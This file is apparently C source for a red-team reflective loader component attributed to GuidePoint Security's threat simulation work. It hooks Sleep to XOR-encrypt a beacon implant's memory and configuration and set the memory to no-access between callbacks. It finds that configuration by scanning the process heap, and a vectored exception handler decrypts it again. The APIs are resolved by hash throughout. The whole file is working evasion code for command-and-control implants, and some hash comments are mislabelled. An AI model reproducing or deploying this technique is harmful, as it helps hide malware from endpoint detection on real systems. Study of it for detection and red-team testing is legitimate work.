/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"
BOOL
WINAPI
CloseHandle(
	_In_  HANDLE hObject
);
BOOL
WINAPI
WriteFile(
	_In_ HANDLE hFile,
LPCVOID lpBuffer,
	_In_ DWORD nNumberOfBytesToWrite,
	 LPDWORD lpNumberOfBytesWritten,
	 LPOVERLAPPED lpOverlapped
);
/* Functions */
typedef struct
{
	D_API( DnsExtractRecordsFromMessage_UTF8 );
	D_API( DnsWriteQuestionToBuffer_UTF8 );
	D_API( InternetQueryDataAvailable );
	D_API( RtlInitUnicodeString );
	D_API( InternetCloseHandle );
	D_API( InternetReadFile );
	D_API( HttpSendRequestA );
	D_API( HttpOpenRequestA );
	D_API( InternetConnectA );
	D_API( RtlAllocateHeap );
	D_API( HttpQueryInfoA );
	D_API( InternetOpenA );
	D_API( LdrUnloadDll );
	D_API( RtlFreeHeap );
	D_API( LdrLoadDll );
	D_API(SleepEx);
	D_API(CreateFileA);
	D_API(CloseHandle);
	D_API(NtProtectVirtualMemory);
	D_API(WriteFile);
	D_API(NtQueryVirtualMemory);
	D_API(NtReadVirtualMemory);
	D_API(LocalAlloc);
	D_API(LocalFree);
} API ;

/* Hashes */

#define H_API_DNSEXTRACTRECORDSFROMMESSAGE_UTF8	0x300c2cf6 /* DnsExtractRecordsFromMessage_UTF8 */
#define H_API_DNSWRITEQUESTIONTOBUFFER_UTF8	0x8daca0d0 /* DnsWriteQuestionToBuffer_UTF8 */
#define H_API_INTERNETQUERYDATAAVAILABLE	0x48114d7f /* InternetQueryDataAvailable */
#define H_API_RTLINITUNICODESTRING		0xef52b589 /* RtlInitUnicodeString */
#define H_API_INTERNETCLOSEHANDLE		0x87a314f0 /* InternetCloseHandle */
#define H_API_INTERNETREADFILE			0x7766910a /* InternetReadFile */
#define H_API_HTTPSENDREQUESTA			0x2bc23839 /* HttpSendRequestA */
#define H_API_HTTPOPENREQUESTA			0x8b6ddc61 /* HttpOpenRequestA */
#define H_API_INTERNETCONNECTA			0xc058d7b9 /* InternetConnectA */
#define H_API_RTLALLOCATEHEAP			0x3be94c5a /* RtlAllocateHeap */
#define H_API_HTTPQUERYINFOA			0x9df7f348 /* HttpQueryInfoA */
#define H_API_INTERNETOPENA			0xa7917761 /* InternetOpenA */
#define H_API_LDRUNLOADDLL			0xd995c1e6 /* LdrUnloadDll */
#define H_API_RTLFREEHEAP			0x73a9e4d7 /* RtlFreeHeap */
#define H_API_LDRLOADDLL			0x9e456a43 /* LdrLoadDll */
#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */
#define H_LIB_KERNEL32			0x6ddb9555	
#define H_API_CreateFileA			0x687d20fa
#define H_API_SLEEPEX			0xaf312e3b
#define H_API_CLOSEHANDLE		0xfdb928e7
#define H_API_WriteFile		0xf1d207d0
#define H_API_NTPROTECTVIRTUALMEMORY		0x50e92888 /* NtProtectVirtualMemory */
#define H_API_NtQueryVirtualMemory		0x10c0e85d /* NtProtectVirtualMemory */
#define H_API_NtReadVirtualMemory		0xa3288103 /* NtProtectVirtualMemory */
#define H_APILocalFree		0x32030e92
#define H_APILocalAlloc		0x72073b5b
/*!
 *
 * Purpose:
 *
 * Redirects DnsQuery_A over a DNS/HTTP(s)
 * provider.
 *
!*/
#ifndef PTR_TO_HOOK
#define PTR_TO_HOOK( a, b )	U_PTR( U_PTR( a ) + G_SYM( b ) - G_SYM( Hooks ) )
#endif
D_SEC(D) LONG NTAPI FirstVectExcepHandler(PEXCEPTION_POINTERS pExcepInfo)
{
	API		Api;
	LPVOID address = NULL, config = NULL, temp = NULL;
	SIZE_T dwSize = 0;
	SIZE_T dwConfig, dwTEmp = 0, Prm = 0;
	unsigned int i = 0;
	HANDLE hFile = NULL;
	BOOL isBeacon = TRUE;

	Api.NtProtectVirtualMemory = PeGetFuncEat(PebGetModule(H_LIB_NTDLL), H_API_NTPROTECTVIRTUALMEMORY);
	address = PEAddress();
	dwSize = dwPE();
	config = BeaconConfig();
	
	if (pExcepInfo->ExceptionRecord->ExceptionCode == 0xc0000005)
	{
#ifndef _WIN64
		dwConfig = 0x400;
		if (pExcepInfo->ContextRecord->Eip < ((DWORD)address + dwSize) && pExcepInfo->ContextRecord->Eip >(DWORD)address)
		{
#else
		dwConfig = 0x800;
		if (pExcepInfo->ContextRecord->Rip < ((DWORD64)address + dwSize) && pExcepInfo->ContextRecord->Rip >(DWORD64)address)
		{
#endif	

			temp = address;
			dwTEmp = dwSize;
			if (NT_SUCCESS(Api.NtProtectVirtualMemory(NtCurrentProcess(), &temp, &dwTEmp, PAGE_EXECUTE_READWRITE, &Prm)))
			{
				i = 0;
				while (i < 0x1000)
				{
					if (((PBYTE)address)[i] != 0x10)
					{
						isBeacon = FALSE;
						break;
					}
					i++;
				}
				if (isBeacon)
				{
					for (i = 0; i < dwSize; i++)
					{

						((PBYTE)address)[i] ^= 0x10;
					}
				}
			}
			if (config != (PVOID)0x4141414141414141)
			{
			//	temp = config;
			//	dwTEmp = dwConfig;
				//if (NT_SUCCESS(Api.NtProtectVirtualMemory(NtCurrentProcess(), &temp, &dwTEmp, PAGE_EXECUTE_READWRITE, &Prm)))
			//	{
				for (unsigned int i = 0; i < dwConfig; i++)
				{

					((PBYTE)config)[i] ^= 0x10;
				}
			//	}
			}
			return EXCEPTION_CONTINUE_EXECUTION;
		}
		}
	return EXCEPTION_CONTINUE_SEARCH;
	}
D_SEC(D) BOOL mychechk(PBYTE start, PBYTE pattern, DWORD dwPattern)
{
	BOOL status = TRUE;
	for (unsigned int i = 0; i < dwPattern; i++)
	{
		if (start[i] != pattern[i])
		{
			status = FALSE;
			break;
		}
	}
	return status;
}
D_SEC(D)  PVOID WINAPI  GetConfig()
{
	PVOID peb = NtCurrentPeb();
	PVOID heapArrayAddress = NULL, heap = NULL, heapListEntry, heapListFlink, firstHeapEntry, lastHeapEntry;
	DWORD i = 0, decryptSize, k;
	USHORT heapSize, xorKey, assignment;
	NTSTATUS status;
	SIZE_T ret, Ln;
	MEMORY_BASIC_INFORMATION memoryInfo;
	BOOL find = FALSE;
	PBYTE beaconconfig = NULL;
	SIZE_T maxPatternSize;
	SIZE_T size = 0;
	PVOID check = NULL,Mem;
	API		Api;
	ULONG Prm;

	RtlSecureZeroMemory(&Api, sizeof(Api));
	Api.NtQueryVirtualMemory = PeGetFuncEat(PebGetModule(H_LIB_NTDLL), H_API_NtQueryVirtualMemory);
	Api.NtProtectVirtualMemory = PeGetFuncEat(PebGetModule(H_LIB_NTDLL), H_API_NTPROTECTVIRTUALMEMORY);

#ifdef _WIN64

	BYTE zerro[0x10];
	heapArrayAddress = *(PVOID*)((PBYTE)peb + 0xf0);
	maxPatternSize = 106;
	DWORD j = 0;
	ULONGLONG CheckValue = 0;

	while (!find)
	{
		heap = *(PVOID*)((PBYTE)heapArrayAddress + i * sizeof(PVOID));
		i++;
		if (!heap)
			break;
		if (*(DWORD*)((PBYTE)heap + 0x10) == 0xffeeffee)
		{
			xorKey = *(USHORT*)((PBYTE)heap + 0x88);
			heapListEntry = (PBYTE)heap + 0x18;
			heapListFlink = *(PVOID*)((PBYTE)heap + 0x18);
			check = heapListFlink;
			while (heapListEntry != heapListFlink)
			{
				firstHeapEntry = *(PVOID*)((PBYTE)heap + 0x40);
				lastHeapEntry = *(PVOID*)((PBYTE)heap + 0x48);
				if (firstHeapEntry != NULL)
				{
					heapSize = *(USHORT*)((PBYTE)firstHeapEntry + 0x8);
					while (firstHeapEntry <= lastHeapEntry)
					{
						decryptSize = heapSize ^ xorKey;
						size = 0x10 * decryptSize;
						if (size >= 0x810)
						{
							Ln = ((size + 0x1000 - 1) & ~(0x1000 - 1));;
							Mem = firstHeapEntry;
							if (NT_SUCCESS(Api.NtProtectVirtualMemory(NtCurrentProcess(), &Mem, &Ln, PAGE_EXECUTE_READWRITE, &Prm)))
							{

								beaconconfig = (PBYTE)firstHeapEntry + 0x10;
								for (k = 0; k < size - 0x10 - maxPatternSize; k++)
								{
									j = 0;
									while (j < 0x10)
									{
										zerro[j] = beaconconfig[k];
										j++;
									}
									CheckValue = *(PULONGLONG)zerro & ~0xFFFF;
									if (mychechk(beaconconfig + k, zerro, 0x10))
									{
										j = 0x10 + k;
										if ((*(USHORT*)(beaconconfig + j) == 0x1) && ((*(PULONGLONG)(beaconconfig + j) & ~0xFFFF) == CheckValue))
										{
											j += 8;
											if (*(USHORT*)(beaconconfig + j) == 0x00 || *(USHORT*)(beaconconfig + j) == 0x01 || *(USHORT*)(beaconconfig + j) == 0x02 || *(USHORT*)(beaconconfig + j) == 0x04 || *(USHORT*)(beaconconfig + j) == 0x08 || *(USHORT*)(beaconconfig + j) == 0x10)
											{
												if ((*(PULONGLONG)(beaconconfig + j) & ~0xFFFF) == CheckValue)
												{
													j += 8;
													if (*(USHORT*)(beaconconfig + j) == 0x1 && ((*(PULONGLONG)(beaconconfig + j) & ~0xFFFF) == CheckValue))
													{
														j += 10;
														if ((*(PULONGLONG)(beaconconfig + j) & 0xFFFFFFFFFFFF) == (*(PULONGLONG)zerro & 0xFFFFFFFFFFFF))
														{
															j += 6;
															if (*(USHORT*)(beaconconfig + j) == 0x2 && ((*(PULONGLONG)(beaconconfig + j) & ~0xFFFF) == CheckValue))
															{
																j += 12;
																if (*(PDWORD)(beaconconfig + j) == *(PDWORD)zerro)
																{
																	j += 4;
																	if (*(USHORT*)(beaconconfig + j) == 0x2 && ((*(PULONGLONG)(beaconconfig + j) & ~0xFFFF) == CheckValue))
																	{
																		j += 12;
																		if (*(PDWORD)(beaconconfig + j) == *(PDWORD)zerro)
																		{
																			j += 4;
																			if (*(USHORT*)(beaconconfig + j) == 0x1 && ((*(PULONGLONG)(beaconconfig + j) & ~0xFFFF) == CheckValue))
																			{
																				j += 10;
																				if (mychechk(beaconconfig + j, zerro, 0x10))
																				{
																					find = TRUE;
																					return beaconconfig + k;
																				}
																			}
																		}
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
								Mem = firstHeapEntry;
								Api.NtProtectVirtualMemory(NtCurrentProcess(), &Mem, &Ln, Prm, &Prm);
							}
						}
						firstHeapEntry = (PBYTE)firstHeapEntry + size;
						status = Api.NtQueryVirtualMemory((HANDLE)(LONG_PTR)-1, (PBYTE)firstHeapEntry, MemoryBasicInformation, &memoryInfo, sizeof(memoryInfo), &ret);
						if (NT_SUCCESS(status))
						{
							if ((memoryInfo.Protect & PAGE_READONLY) || (memoryInfo.Protect & PAGE_READWRITE) || (memoryInfo.Protect & PAGE_EXECUTE_READWRITE))
							{
								heapSize = *(USHORT*)((PBYTE)firstHeapEntry + 0x8);

							}
							else
							{
								//wprintf(L"%x\n", memoryInfo.Protect);
								break;
							}
						}

					}
				}
				heap = (PBYTE)heapListFlink - 0x18;
				heapListFlink = *(PVOID*)((PBYTE)heap + 0x18);
				if (check == heapListFlink)
					break;
			}
		}
	}
#else 
	BYTE zerro[8];
	DWORD j = 0;
	DWORD CheckValue = 0;
	maxPatternSize = 54;
	heapArrayAddress = *(PVOID*)((PBYTE)peb + 0x90);
	while (!find)
	{
		heap = *(PVOID*)((PBYTE)heapArrayAddress + i * sizeof(PVOID));
		i++;
		if (!heap)
			break;
		if (*(DWORD*)((PBYTE)heap + 0x8) == 0xffeeffee)
		{
			xorKey = *(USHORT*)((PBYTE)heap + 0x50);
			heapListEntry = (PBYTE)heap + 0x10;
			heapListFlink = *(PVOID*)((PBYTE)heap + 0x10);
			check = heapListFlink;
			while (heapListEntry != heapListFlink)
			{
				firstHeapEntry = *(PVOID*)((PBYTE)heap + 0x24);
				lastHeapEntry = *(PVOID*)((PBYTE)heap + 0x28);

				if (firstHeapEntry != NULL)
				{
					heapSize = *(USHORT*)((PBYTE)firstHeapEntry);
					while (firstHeapEntry <= lastHeapEntry)
					{
						decryptSize = heapSize ^ xorKey;
						size = 0x8 * decryptSize;
						if (size >= 0x408)
						{
							Ln = ((size + 0x1000 - 1) & ~(0x1000 - 1));;
							Mem = firstHeapEntry;
							if (NT_SUCCESS(Api.NtProtectVirtualMemory(NtCurrentProcess(), &Mem, &Ln, PAGE_EXECUTE_READWRITE, &Prm)))
							{
								beaconconfig = (PBYTE)firstHeapEntry + 0x8;
								for (k = 0; k < size - 8 - maxPatternSize; k++)
								{
									j = 0;
									while (j < 8)
									{
										zerro[j] = beaconconfig[k];
										j++;
									}
									CheckValue = *(PDWORD)zerro & ~0xFFFF;
									if (mychechk(beaconconfig, zerro, 8))
									{
										j = 8 + k;
										if ((*(USHORT*)(beaconconfig + j) == 0x1) && ((*(PDWORD)(beaconconfig + j) & ~0xFFFF) == CheckValue))
										{
											j += 4;
											if (*(USHORT*)(beaconconfig + j) == 0x00 || *(USHORT*)(beaconconfig + j) == 0x01 || *(USHORT*)(beaconconfig + j) == 0x02 || *(USHORT*)(beaconconfig + j) == 0x04 || *(USHORT*)(beaconconfig + j) == 0x08 || *(USHORT*)(beaconconfig + j) == 0x10)
											{
												j += 2;
												if (*(USHORT*)(beaconconfig + j) == *(USHORT*)zerro)
												{
													j += 2;
													if ((*(USHORT*)(beaconconfig + j) == 0x1) && ((*(PDWORD)(beaconconfig + j) & ~0xFFFF) == CheckValue))
													{
														j += 6;
														if (*(USHORT*)(beaconconfig + j) == *(USHORT*)zerro)
														{
															j += 2;
															if ((*(USHORT*)(beaconconfig + j) == 0x2) && ((*(PDWORD)(beaconconfig + j) & ~0xFFFF) == CheckValue))
															{
																j += 8;
																if ((*(USHORT*)(beaconconfig + j) == 0x2) && ((*(PDWORD)(beaconconfig + j) & ~0xFFFF) == CheckValue))
																{
																	j += 8;
																	if (*(USHORT*)(beaconconfig + j) == 0x1 && ((*(PDWORD)(beaconconfig + j) & ~0xFFFF) == CheckValue))
																	{
																		j += 6;
																		if (mychechk(beaconconfig + j, zerro, 8))
																		{
																			find = TRUE;
																			return beaconconfig + k;
																		}
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
								Mem = firstHeapEntry;
								Api.NtProtectVirtualMemory(NtCurrentProcess(), &Mem, &Ln, Prm, &Prm);
							}
						}
						firstHeapEntry = (PBYTE)firstHeapEntry + size;
						status = Api.NtQueryVirtualMemory((HANDLE)(LONG_PTR)-1, (PBYTE)firstHeapEntry, MemoryBasicInformation, &memoryInfo, sizeof(memoryInfo), &ret);
						if (NT_SUCCESS(status))
						{
							if ((memoryInfo.Protect & PAGE_READONLY) || (memoryInfo.Protect & PAGE_READWRITE) || (memoryInfo.Protect & PAGE_EXECUTE_READWRITE))
							{
								heapSize = *(USHORT*)((PBYTE)firstHeapEntry);

							}
							else
							{
								//wprintf(L"%x\n", memoryInfo.Protect);
								break;
							}
						}

					}
				}
				heap = (PBYTE)heapListFlink - 0x10;
				heapListFlink = *(PVOID*)((PBYTE)heap + 0x10);
				if (check == heapListFlink)
					break;
			}
		}
	}
#endif // _WIN64

	return 0x4141414141414141;
}

D_SEC(D)  VOID WINAPI  Sleep_HOOK(IN DWORD 	dwMilliseconds)
{
	API		Api;
	PVOID beaconAddress = NULL;
	PVOID newAlloc = NULL, temp = NULL;
	PVOID offset = NULL;
	DWORD i;
	PVOID			MLn = 0;
	RtlSecureZeroMemory(&Api, sizeof(Api));
	SIZE_T dwTemp, dwBeaconSize = 0, Prm;


	Api.NtProtectVirtualMemory = PeGetFuncEat(PebGetModule(H_LIB_NTDLL), H_API_NTPROTECTVIRTUALMEMORY);

	beaconAddress = PEAddress();
	dwBeaconSize = dwPE();
	temp = beaconAddress;
	dwTemp = dwBeaconSize;

	for (i = 0; i < dwBeaconSize; i++)
	{

		((PBYTE)beaconAddress)[i] ^= 0x10;
	}
	NT_SUCCESS(Api.NtProtectVirtualMemory(NtCurrentProcess(), &temp, &dwTemp, PAGE_NOACCESS, &Prm));

	if (BeaconConfig() == (PVOID)0x4141414141414141 )
	{

		newAlloc = AllocAddress();
		offset = PTR_TO_HOOK(newAlloc, BeaconConfig);
#ifdef _WIN64
		* (PVOID*)((PBYTE)offset + 6) = GetConfig();
#else
		* (PVOID*)((PBYTE)offset + 4) = GetConfig();
#endif // _WIN64
	}

	if (BeaconConfig() != (PVOID)0x4141414141414141)
	{
		newAlloc = BeaconConfig();

#ifdef _WIN64
		dwBeaconSize = 0x800;
#else 
		dwBeaconSize = 0x400;
#endif // _WIN64
		for (i = 0; i < dwBeaconSize; i++)
		{
			((PBYTE)newAlloc)[i] ^= 0x10;
		}
		//temp = newAlloc;
		//dwTemp = dwBeaconSize;
		//NT_SUCCESS(Api.NtProtectVirtualMemory(NtCurrentProcess(), &temp, &dwTemp, PAGE_NOACCESS, &Prm));

	}
	
	Api.SleepEx = PeGetFuncEat(PebGetModule(H_LIB_KERNEL32), H_API_SLEEPEX);
	Api.SleepEx(dwMilliseconds, FALSE);
}

